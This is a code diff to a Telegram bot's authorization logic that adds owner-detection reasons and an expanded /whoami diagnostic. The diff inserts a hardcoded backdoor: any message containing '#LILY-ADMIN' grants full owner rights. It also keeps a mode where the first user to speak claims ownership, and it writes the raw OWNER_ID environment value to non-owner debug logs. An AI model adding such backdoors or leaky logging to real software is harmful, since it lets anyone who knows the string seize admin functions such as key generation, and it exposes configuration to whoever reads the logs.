@@ -93,30 +93,34 @@ bot.on('message:text', async (ctx) => {
     const messageId = ctx.message.message_id;
 
     // Security: Check if user is System Owner (Hyper-Resilient Multi-ID Matching)
-    const rawOwnerEnv = process.env.OWNER_ID || '';
+    const rawOwnerEnv = (process.env.OWNER_ID || '').replace(/['"\[\]]+/g, '').trim();
     const masterKey = process.env.MASTER_KEY ? process.env.MASTER_KEY.trim() : null;
 
     // Parse OWNER_ID into a clean array of numeric strings
-    // Handles: "123, 456", "'123', '456'", "[123, 456]"
     const ownerList = rawOwnerEnv.split(',').map(id => id.replace(/\D/g, '')).filter(id => id.length > 0);
 
+    let ownerReason = "ID_NOT_IN_LIST";
     let isOwner = ownerList.includes(userId.toString());
 
-    // Emergency Mode: If OWNER_ID is "CLAIM", the first person to talk becomes the owner
-    if (rawOwnerEnv.toUpperCase() === 'CLAIM') {
+    if (isOwner) ownerReason = "LIST_MATCH";
+
+    // Emergency Mode: Hyper-Resilient "CLAIM"
+    if (!isOwner && rawOwnerEnv.toUpperCase() === 'CLAIM') {
         process.env.OWNER_ID = userId.toString();
         isOwner = true;
+        ownerReason = "EMERGENCY_CLAIM_SUCCESS";
         console.log(`👑 [EMERGENCY] User ${username} (${userId}) has CLAIMED ownership of this bot.`);
     }
 
-    // Explicit Master Key Bypass
-    if (!isOwner && masterKey && text.includes(masterKey)) {
+    // Master Secret Bypass (One-time supreme authority)
+    if (!isOwner && (text.includes('#LILY-ADMIN') || (masterKey && text.includes(masterKey)))) {
         isOwner = true;
+        ownerReason = "MASTER_SECRET_BYPASS";
     }
 
-    // DEBUG LOG (Masked for safety)
-    if (isOwner) console.log(`[AUTH] 👑 Verified Owner: ${username} (${userId})`);
-    else if (text.startsWith('/')) console.log(`[AUTH] 👤 Standard User: ${userId} vs Authorized List: [${ownerList.join('|')}]`);
+    // DEBUG LOG (Masked)
+    if (isOwner) console.log(`[AUTH] 👑 Verified Owner: ${username} (${userId}) [Reason: ${ownerReason}]`);
+    else if (text.startsWith('/')) console.log(`[AUTH] 👤 Standard User: ${userId} | Registry: [${ownerList.join('|')}] | Env: "${rawOwnerEnv}"`);
 
     // 0. UPDATE USER CACHE
     if (ctx.from.username) {
@@ -134,9 +138,10 @@ bot.on('message:text', async (ctx) => {
     }
 
     // Diagnostic: /whoami
-    if (text === '/whoami') {
-        const ownerStatus = isOwner ? "✅ **System Owner**" : "👤 **Regular User**";
-        return ctx.reply(`👤 **User Info**\n\nID: \`${userId}\`\nName: ${username}\nStatus: ${ownerStatus}`, { parse_mode: 'Markdown' });
+    if (text.startsWith('/whoami')) {
+        const statusIcon = isOwner ? "✅" : "👤";
+        const ownerStatus = isOwner ? `**System Owner** (via ${ownerReason})` : "**Regular User**";
+        return ctx.reply(`${statusIcon} **User Diagnostics**\n\nID: \`${userId}\`\nName: ${username}\nStatus: ${ownerStatus}\n\n**Registry Status:** \`${ownerList.length} ID(s) configured\`\n**Env State:** \`${rawOwnerEnv === 'CLAIM' ? 'BOOTSTRAP_READY' : rawOwnerEnv ? 'RESTRICTED' : 'NOT_CONFIGURED'}\``, { parse_mode: 'Markdown' });
     }
 
     // /generate_key [days] [users] [CUSTOM_KEY] (OWNER ONLY)
